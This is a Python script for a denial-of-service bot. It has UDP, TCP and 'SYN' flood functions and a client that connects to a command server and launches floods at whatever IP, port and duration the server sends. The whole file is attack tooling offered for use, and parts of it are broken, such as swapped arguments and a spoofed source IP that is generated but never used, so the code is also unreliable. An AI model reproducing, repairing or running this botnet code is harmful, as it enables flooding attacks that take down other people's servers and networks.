import time
import socket
import random
import threading

# Function to carry out UDP, TCP, and SYN Flood
def flood_attack(attack_type, target_ip, target_port, duration=10):
    start_time = time.time()
    
    if attack_type == 'udp':
        # UDP flood
        def udp_flood():
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            client.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            while time.time() - start_time < duration:
                # Random data to flood the target
                data = random._urandom(1024)
                client.sendto(data, (target_ip, target_port))
            print(f"UDP Flood attack on {target_ip}:{target_port} completed.")
        
        # Start UDP flood in a separate thread
        threading.Thread(target=udp_flood).start()
    
    elif attack_type == 'tcp':
        # TCP flood
        def tcp_flood():
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while time.time() - start_time < duration:
                try:
                    client.connect((target_ip, target_port))
                    client.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
                except:
                    pass
            print(f"TCP Flood attack on {target_ip}:{target_port} completed.")
        
        # Start TCP flood in a separate thread
        threading.Thread(target=tcp_flood).start()
    
    elif attack_type == 'syn':
        # SYN flood
        def syn_flood():
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            while time.time() - start_time < duration:
                # Random source IP for SYN flood
                src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
                client.connect((target_ip, target_port))
                client.sendto(b'GET / HTTP/1.1\r\n', (target_ip, target_port))
                client.close()
            print(f"SYN Flood attack on {target_ip}:{target_port} completed.")
        
        # Start SYN flood in a separate thread
        threading.Thread(target=syn_flood).start()

    else:
        print("Invalid attack type. Please choose 'udp', 'tcp', or 'syn'.")


def connect_as_client(host, port, username):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    client.send(username.encode('utf-8')) 
    
    print("Connected as client. Waiting for commands...")
    
    while True:
        command = client.recv(1024).decode('utf-8').lower()
        if command:
            if command.startswith("attack"):
                command = command.split()
                target_ip = command[2]
                target_port = command[3]
                attack_type = command[1]
                duration = command[4]
                flood_attack(target_ip, target_port, attack_type, duration)
        else:
            break
    
    client.close()

if __name__ == "__main__":
    connect_as_client("127.0.0.1", 65432, "client")







